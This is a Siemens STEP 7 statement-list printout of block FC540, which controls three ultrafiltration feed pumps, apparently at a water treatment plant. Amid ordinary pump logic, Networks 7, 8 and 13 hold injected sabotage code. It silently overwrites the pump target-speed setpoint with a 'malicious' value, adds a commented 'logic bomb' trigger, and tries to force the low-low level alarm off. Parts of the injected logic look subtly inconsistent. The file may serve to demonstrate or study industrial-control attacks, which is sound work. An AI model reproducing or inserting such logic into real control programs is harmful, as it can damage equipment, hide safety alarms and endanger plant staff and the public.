SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:03 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

FC540 - <offline>
"GRP001_DVC_LGC"     
Name: Family:
Author: Version: 0.1

Block version: 2
Time stamp Code: 01/02/2013 01:59:05 PM

Interface: 04/10/2012 06:29:49 PM
Lengths (block/logic/data): 03896  03702  00026

 Name  Data Type  Address  Comment 

  IN 0.0

  OUT 0.0

  IN_OUT 0.0

  TEMP 0.0

    NEWTR_SPD_PASS_01 Real 0.0

    NEWTR_SPD_PASS_02 Real 4.0

    NEWTR_SPD_CMD_01 Real 8.0

    NEWTR_SPD_CMD_02 Real 12.0

  RETURN 0.0

    RET_VAL 0.0

Block: FC540        

Network: 1        GAF11AP001 : NEWate Feed Pump A 

Linking, 0=Operator Active

      UN    DB201.DBX    2.1 "GRP001_CONTROL".GRP_MANUAL
      =     DB502.DBX    0.1 "GAF11AP001".LIOP_SEL      -- Select : 1=Linking, 0=Operator Active

Network: 2        GAF11AP001 : NEWate Feed Pump A 

Linkable Input for MANUAL/AUTO Mode

      U     DB201.DBX    2.0 "GRP001_CONTROL".GRP_AUTO 
      =     DB502.DBX    0.2 "GAF11AP001".AUT_L         -- Linkable Input for MANUAL/AUTO Mode

Network: 3        GAF11AP001 : NEWate Feed Pump A  

AUTO Mode command; 1=ON, 0=OFF

      U     DB202.DBX   12.1 "GAF11/12AP001_DTYSTB".START_A -- Start Pump A
      =     DB502.DBX    0.6 "GAF11AP001".AUTO_ON       -- AUTO Mode command; 1=ON, 0=OFF

Network: 4        GAF11AP001 : NEWate Feed Pump A  

Linkable Input RESET

      U     DB201.DBX    2.2 "GRP001_CONTROL".GRP_RESET
      =     DB502.DBX    0.3 "GAF11AP001".L_RESET       -- Linkable Input RESET

                                                                                   Page 1 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

Network: 5        GAF11AP001 : NEWate Feed Pump A Ramp Control

      U     M      0.1 @LOG_1                    
      =     L     16.0
      U     L     16.0
      U(    
      L     DB202.DBW   42 "GAF11/12AP001_DTYSTB".PUMP_RB -- DUTY PUMP A OR B RADIO BUTTON 1=A, 2=B
      L     1
      ==I   
      )     
      =     L     16.1
      U     L     16.1
      SPBNB _001
      L     DB502.DBD   52 "GAF11AP001".QFB_SPEED     -- Scaled speed 
      T     #NEWTR_SPD_PASS_01 #NEWTR_SPD_PASS_01        
_001: NOP   0
      U     L     16.1
      SPBNB _002
      L     DB502.DBD   48 "GAF11AP001".QSPEED_R      -- Speed commmand real
      T     #NEWTR_SPD_CMD_01 #NEWTR_SPD_CMD_01         
_002: NOP   0
      U     L     16.0
      U(    
      L     DB202.DBW   42 "GAF11/12AP001_DTYSTB".PUMP_RB -- DUTY PUMP A OR B RADIO BUTTON 1=A, 2=B
      L     2
      ==I   
      )     
      =     L     16.1
      U     L     16.1
      SPBNB _003
      L     DB503.DBD   52 "GAF12AP001".QFB_SPEED     -- Scaled speed 
      T     #NEWTR_SPD_PASS_01 #NEWTR_SPD_PASS_01        
_003: NOP   0
      U     L     16.1
      SPBNB _004
      L     DB503.DBD   48 "GAF12AP001".QSPEED_R      -- Speed commmand real
      T     #NEWTR_SPD_CMD_01 #NEWTR_SPD_CMD_01         
_004: NOP   0
      U     DB212.DBX  196.1 "UF_A_SEQ".STRT_FEED_PMP_RAMP_UP -- START FEED PUMPS RAMPING UP
      =     L     16.1
      BLD   103
      U     DB212.DBX  196.2 "UF_A_SEQ".STRT_FEED_PMP_RAMP_DOWN -- START FEED PUMPS RAMPING DOWN
      =     L     16.3
      BLD   103
      U     L     16.0
      SPBNB _005
      CALL  FB     2 , DB204 RAMP_GEN / GAF11AP001_RAMP
       REQ1       :=L16.1
       REQ2       :=
       REQ3       :=L16.3
       REQ4       :=
       REQ5       :=
       REQ6       :=
       REQ7       :=
       REQ8       :=
       X1         :=DB100.DBD664 "PROCESS_SP".SP_FD_PMP_STRT_SPD_SP -- UF FEED PUMP INITIAL START SPEED SE

T POINT IN %
       Td1        :=DB100.DBD672 "PROCESS_SP".SP_FD_PMP_RAMP_UP_TIME -- UF FEED PUMP TIME DURATION FOR SPE

ED RAMPING UP IN SECONDS
       X2         :=DB100.DBD668 "PROCESS_SP".SP_FD_PMP_TARGET_SPD_SP -- UF FEED PUMP TARGET SPEED SET POI

NT IN %
       Td2        :=
       X3         :=#NEWTR_SPD_PASS_01 #NEWTR_SPD_PASS_01        
       Td3        :=DB100.DBD676 "PROCESS_SP".SP_FD_PMP_RAMP_DOWN_TIME -- UF FEED PUMP TIME DURATION FOR S

PEED RAMPING DOWN IN SECONDS
       X4         :=DB100.DBD664 "PROCESS_SP".SP_FD_PMP_STRT_SPD_SP -- UF FEED PUMP INITIAL START SPEED SE

T POINT IN %
       Td4        :=
       X5         :=
       Td5        :=
       X6         :=
       Td6        :=
       X7         :=
       Td7        :=
       X8         :=
       Td8        :=
       ACT_VALUE  :=
       HOLD_IN    :=
       TOL_SEL    :=
       TOLERANCE  :=
       READY      :=

                                                                                   Page 2 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

       HOLD_OUT   :=
       RAMP_OUT   :=
       RAMP_ACTV  :=
       TIME_REMAIN:=
_005: NOP   0

Network: 6        GAF11AP001: PID AUTO MANUAL, DIR SEL AND SP SEL

      U     M      0.1 @LOG_1                    
      =     L     16.0
      U     L     16.0
      UN    DB215.DBX    1.5 "GRP002_COMMANDS".UF_A_FEED_PMP_MOD_ON -- UF MODULE A FEED PUMP MODULATION ON REQU

EST
      SPBNB _006
      L     #NEWTR_SPD_CMD_01 #NEWTR_SPD_CMD_01         
      T     DB208.DBD   38 "GAF11AP001_PID".MAN       -- Manual Value
_006: NOP   0
      U     L     16.0
      UN    DB215.DBX    1.5 "GRP002_COMMANDS".UF_A_FEED_PMP_MOD_ON -- UF MODULE A FEED PUMP MODULATION ON REQU

EST
      =     DB208.DBX   10.1
      U     L     16.0
      U     M      0.0 @LOG_0                    
      =     DB208.DBX   11.0
      U     L     16.0
      U     M      0.0 @LOG_0                    
      =     DB208.DBX   11.2
      U     L     16.0
      U     DB215.DBX    1.5 "GRP002_COMMANDS".UF_A_FEED_PMP_MOD_ON -- UF MODULE A FEED PUMP MODULATION ON REQU

EST
      SPBNB _007
      L     #NEWTR_SPD_CMD_01 #NEWTR_SPD_CMD_01         
      T     DB204.DBD   78 "GAF11AP001_RAMP".RAMP_OUT
_007: NOP   0

Network: 7    

// Original safe setpoint
      L     DB100.DBD  668 // "SP_FD_PMP_TARGET_SPD_SP" "PROCESS_SP".SP_FD_PMP_TARGET_SPD_SP -- 

UF FEED PUMP TARGET SPEED SET POINT IN %
      T     MD   150 Target_Speed              

// Injected code (placed before or after normal logic)
      L     1.500000e+002 // New malicious setpoint (was e.g., 100.0)
      T     DB100.DBD  668 // Overwrites original value silently "PROCESS_SP".SP_FD_PMP_TARGET_SPD_SP -- 

UF FEED PUMP TARGET SPEED SET POINT IN %

Network: 8    

      L     DB100.DBD  100 // Total run time in hours "PROCESS_SP".SP_CHEM_AIR_SCOUR -- CHEMIC
AL AIR SCOUR IN MINUTES

      L     1.000000e+002
      >=R   
      =     M     20.0 // Logic bomb trigger

      U     M     20.0
      L     1.000000e+002 // Max speed
      T     DB100.DBD  668 // Overwrites target speed setpoint "PROCESS_SP".SP_FD_PMP_TARGET_SPD_SP -- 

UF FEED PUMP TARGET SPEED SET POINT IN %

Network: 9       GAF11AP001 : PID CALL

      CALL  FB    20 , DB208 PID_TYP2 / GAF11AP001_PID 
       U       :=DB513.DBD70 "GAC31CF001".U             -- Analog Input (Scaled Value)
       SAMPLE_T:=MD20 OB_35_SAMLE_T              -- Sample Time
       PID_CW  :=
       LMN     :=
       LMN_PER :=
       GAIN    :=
       DEADB_W :=
       TI      :=
       TD      :=

                                                                                   Page 3 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

       TM_LAG  :=
       MAN     :=
       LMN_HLM :=
       LMN_LLM :=
       SP_INT  :=
       SP_EXT  :=DB100.DBD680 "PROCESS_SP".SP_UF_A_FEED_PMP_FLW_SP -- UF MODULE A FEED PUMP FLOW CONTROL SETPOIN

T IN m3/hr
      NOP   0

Network: 10       GAF11AP001 : NEWate Feed Pump A  

FOR START CONDITION - INTERLOCK BLOCK HAS CALL

      U     DB501.DBX   62.1 "GAC10CL001".QL_ALM        -- 1=LL Alarm active
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0

                                                                                   Page 4 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB502.DBX0.4 "GAF11AP001".START_INT     -- Start Interlock
       DATA     :="ILOCK_DB".GAF11AP001_SI "ILOCK_DB".GAF11AP001_SI  
      NOP   0

Network: 11       GAF11AP001 : NEWate Feed Pump A  

FOR RUN CONDITION - INTERLOCK BLOCK HAS CALL

      U     DB501.DBX   62.1 "GAC10CL001".QL_ALM        -- 1=LL Alarm active
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0

                                                                                   Page 5 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0
       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB502.DBX0.5 "GAF11AP001".RUN_INT       -- Run Interlock
       DATA     :="ILOCK_DB".GAF11AP001_RI "ILOCK_DB".GAF11AP001_RI  
      NOP   0

Network: 12       GAF12AP001 : NEWate Feed Pump B 

Linking, 0=Operator Active

      UN    DB201.DBX    2.1 "GRP001_CONTROL".GRP_MANUAL
      =     DB503.DBX    0.1 "GAF12AP001".LIOP_SEL      -- Select : 1=Linking, 0=Operator Active

Network: 13   

// Normal alarm condition
      U     DB501.DBX   62.1 // LL Alarm active "GAC10CL001".QL_ALM        -- 1=LL Alar

m active
      =     M     40.0

// Injected fault bypass logic
      U     M     50.0 // Malicious flag to suppress alarm
      UN    M     50.0
      =     DB501.DBX   62.1 // Forces alarm off condition when M50.0 "GAC10CL001".QL_ALM        -- 1=LL Alar

is on m active

Network: 14       GAF12AP001 : NEWate Feed Pump B 

Linkable Input for MANUAL/AUTO Mode

      U     DB201.DBX    2.0 "GRP001_CONTROL".GRP_AUTO 
      =     DB503.DBX    0.2 "GAF12AP001".AUT_L         -- Linkable Input for MANUAL/AUTO Mode

Network: 15       GAF12AP001 : NEWate Feed Pump B 

AUTO Mode command; 1=ON, 0=OFF

      O     DB202.DBX   12.2 "GAF11/12AP001_DTYSTB".START_B -- Start Pump B
      O     DB203.DBX   12.2 "GAF12/13AP001_DTYSTB".START_B -- Start Pump B

      =     DB503.DBX    0.6 "GAF12AP001".AUTO_ON       -- AUTO Mode command; 1=ON, 0=OFF

Network: 16       GAF12AP001 : NEWate Feed Pump B   

Linkable Input RESET

      U     DB201.DBX    2.2 "GRP001_CONTROL".GRP_RESET
      =     DB503.DBX    0.3 "GAF12AP001".L_RESET       -- Linkable Input RESET

                                                                                   Page 6 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

Network: 17       GAF12AP001 : NEWate Feed Pump B 

FOR START CONDITION - INTERLOCK BLOCK HAS CALL

      U     DB501.DBX   62.1 "GAC10CL001".QL_ALM        -- 1=LL Alarm active
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0
       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0

                                                                                   Page 7 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB503.DBX0.4 "GAF12AP001".START_INT     -- Start Interlock
       DATA     :="ILOCK_DB".GAF12AP001_SI "ILOCK_DB".GAF12AP001_SI  
      NOP   0

Network: 18       GAF12AP001 : NEWate Feed Pump B 

FOR RUN CONDITION - INTERLOCK BLOCK HAS CALL

      U     DB501.DBX   62.1 "GAC10CL001".QL_ALM        -- 1=LL Alarm active
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0

                                                                                   Page 8 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB503.DBX0.5 "GAF12AP001".RUN_INT       -- Run Interlock
       DATA     :="ILOCK_DB".GAF12AP001_RI "ILOCK_DB".GAF12AP001_RI  
      NOP   0

Network: 19     

Network: 20       GAF13AP001 : NEWate Feed Pump C 

Linking, 0=Operator Active

      UN    DB201.DBX    2.1 "GRP001_CONTROL".GRP_MANUAL
      =     DB504.DBX    0.1 "GAF13AP001".LIOP_SEL      -- Select : 1=Linking, 0=Operator Active

Network: 21       GAF13AP001 : NEWate Feed Pump C    

Linkable Input for MANUAL/AUTO Mode

      U     DB201.DBX    2.0 "GRP001_CONTROL".GRP_AUTO 
      =     DB504.DBX    0.2 "GAF13AP001".AUT_L         -- Linkable Input for MANUAL/AUTO Mode

Network: 22       GAF13AP001 : NEWate Feed Pump C  

AUTO Mode command; 1=ON, 0=OFF

      U     DB203.DBX   12.1 "GAF12/13AP001_DTYSTB".START_A -- Start Pump A
      =     DB504.DBX    0.6 "GAF13AP001".AUTO_ON       -- AUTO Mode command; 1=ON, 0=OFF

Network: 23       GAF13AP001 : NEWate Feed Pump C    

Linkable Input RESET

      U     DB201.DBX    2.2 "GRP001_CONTROL".GRP_RESET
      =     DB504.DBX    0.3 "GAF13AP001".L_RESET       -- Linkable Input RESET

Network: 24       GAF13AP001 : NEWate Feed Pump C Ramp Control

      U     M      0.1 @LOG_1                    
      =     L     16.0
      U     L     16.0
      U(    
      L     DB203.DBW   42 "GAF12/13AP001_DTYSTB".PUMP_RB -- DUTY PUMP A OR B RADIO BUTTON 1=A, 2=B
      L     1
      ==I   
      )     
      =     L     16.1
      U     L     16.1
      SPBNB _008
      L     DB504.DBD   52 "GAF13AP001".QFB_SPEED     -- Scaled speed 
      T     #NEWTR_SPD_PASS_02 #NEWTR_SPD_PASS_02        
_008: NOP   0
      U     L     16.1
      SPBNB _009
      L     DB504.DBD   48 "GAF13AP001".QSPEED_R      -- Speed commmand real
      T     #NEWTR_SPD_CMD_02 #NEWTR_SPD_CMD_02         

                                                                                   Page 9 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

_009: NOP   0
      U     L     16.0
      U(    
      L     DB203.DBW   42 "GAF12/13AP001_DTYSTB".PUMP_RB -- DUTY PUMP A OR B RADIO BUTTON 1=A, 2=B
      L     2
      ==I   
      )     
      =     L     16.1
      U     L     16.1
      SPBNB _00a
      L     DB503.DBD   52 "GAF12AP001".QFB_SPEED     -- Scaled speed 
      T     #NEWTR_SPD_PASS_02 #NEWTR_SPD_PASS_02        
_00a: NOP   0
      U     L     16.1
      SPBNB _00b
      L     DB503.DBD   48 "GAF12AP001".QSPEED_R      -- Speed commmand real
      T     #NEWTR_SPD_CMD_02 #NEWTR_SPD_CMD_02         
_00b: NOP   0
      U     DB222.DBX  196.1 "UF_B_SEQ".STRT_FEED_PMP_RAMP_UP -- START FEED PUMPS RAMPING UP
      =     L     16.1
      BLD   103
      U     DB222.DBX  196.2 "UF_B_SEQ".STRT_FEED_PMP_RAMP_DOWN -- START FEED PUMPS RAMPING DOWN
      =     L     16.3
      BLD   103
      U     L     16.0
      SPBNB _00c
      CALL  FB     2 , DB207 RAMP_GEN / GAF13AP001_RAMP
       REQ1       :=L16.1
       REQ2       :=
       REQ3       :=L16.3
       REQ4       :=
       REQ5       :=
       REQ6       :=
       REQ7       :=
       REQ8       :=
       X1         :=DB100.DBD664 "PROCESS_SP".SP_FD_PMP_STRT_SPD_SP -- UF FEED PUMP INITIAL START SPEED SE

T POINT IN %
       Td1        :=DB100.DBD672 "PROCESS_SP".SP_FD_PMP_RAMP_UP_TIME -- UF FEED PUMP TIME DURATION FOR SPE

ED RAMPING UP IN SECONDS
       X2         :=DB100.DBD668 "PROCESS_SP".SP_FD_PMP_TARGET_SPD_SP -- UF FEED PUMP TARGET SPEED SET POI

NT IN %
       Td2        :=
       X3         :=#NEWTR_SPD_PASS_02 #NEWTR_SPD_PASS_02        
       Td3        :=DB100.DBD676 "PROCESS_SP".SP_FD_PMP_RAMP_DOWN_TIME -- UF FEED PUMP TIME DURATION FOR S

PEED RAMPING DOWN IN SECONDS
       X4         :=DB100.DBD664 "PROCESS_SP".SP_FD_PMP_STRT_SPD_SP -- UF FEED PUMP INITIAL START SPEED SE

T POINT IN %
       Td4        :=
       X5         :=
       Td5        :=
       X6         :=
       Td6        :=
       X7         :=
       Td7        :=
       X8         :=
       Td8        :=
       ACT_VALUE  :=
       HOLD_IN    :=
       TOL_SEL    :=
       TOLERANCE  :=
       READY      :=
       HOLD_OUT   :=
       RAMP_OUT   :=
       RAMP_ACTV  :=
       TIME_REMAIN:=
_00c: NOP   0

Network: 25      GAF13AP001: PID AUTO MANUAL, DIR SEL AND SP SEL

      U     M      0.1 @LOG_1                    
      =     L     16.0
      U     L     16.0
      UN    DB225.DBX    1.5 "GRP003_COMMANDS".UF_B_FEED_PMP_MOD_ON -- UF MODULE A FEED PUMP MODULATION ON REQU

EST
      SPBNB _00d
      L     #NEWTR_SPD_CMD_02 #NEWTR_SPD_CMD_02         
      T     DB210.DBD   38 "GAF13AP001_PID".MAN       -- Manual Value
_00d: NOP   0
      U     L     16.0
      UN    DB225.DBX    1.5 "GRP003_COMMANDS".UF_B_FEED_PMP_MOD_ON -- UF MODULE A FEED PUMP MODULATION ON REQU

EST
      =     DB210.DBX   10.1

                                                                                  Page 10 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

      U     L     16.0
      U     M      0.0 @LOG_0                    
      =     DB210.DBX   11.0
      U     L     16.0
      U     M      0.0 @LOG_0                    
      =     DB210.DBX   11.2
      U     L     16.0
      U     DB225.DBX    1.5 "GRP003_COMMANDS".UF_B_FEED_PMP_MOD_ON -- UF MODULE A FEED PUMP MODULATION ON REQU

EST
      SPBNB _00e
      L     #NEWTR_SPD_CMD_02 #NEWTR_SPD_CMD_02         
      T     DB207.DBD   78 "GAF13AP001_RAMP".RAMP_OUT
_00e: NOP   0

Network: 26      GAF13AP001 : PID CALL

      CALL  FB    20 , DB210 PID_TYP2 / GAF13AP001_PID 
       U       :=DB532.DBD70 "GAC32CF001".U             -- Analog Input (Scaled Value)
       SAMPLE_T:=MD20 OB_35_SAMLE_T              -- Sample Time
       PID_CW  :=
       LMN     :=
       LMN_PER :=
       GAIN    :=
       DEADB_W :=
       TI      :=
       TD      :=
       TM_LAG  :=
       MAN     :=
       LMN_HLM :=
       LMN_LLM :=
       SP_INT  :=
       SP_EXT  :=DB100.DBD684 "PROCESS_SP".SP_UF_B_FEED_PMP_FLW_SP -- UF MODULE B FEED PUMP FLOW CONTROL SETPOIN

T IN m3/hr
      NOP   0

Network: 27       GAF13AP001 : NEWate Feed Pump C   

FOR START CONDITION - INTERLOCK BLOCK HAS CALL

      U     DB501.DBX   62.1 "GAC10CL001".QL_ALM        -- 1=LL Alarm active
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103

                                                                                  Page 11 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0
       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB504.DBX0.4 "GAF13AP001".START_INT     -- Start Interlock
       DATA     :="ILOCK_DB".GAF13AP001_SI "ILOCK_DB".GAF13AP001_SI  
      NOP   0

Network: 28       GAF13AP001 : NEWate Feed Pump C 

FOR RUN CONDITION - INTERLOCK BLOCK HAS CALL

      U     DB501.DBX   62.1 "GAC10CL001".QL_ALM        -- 1=LL Alarm active
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
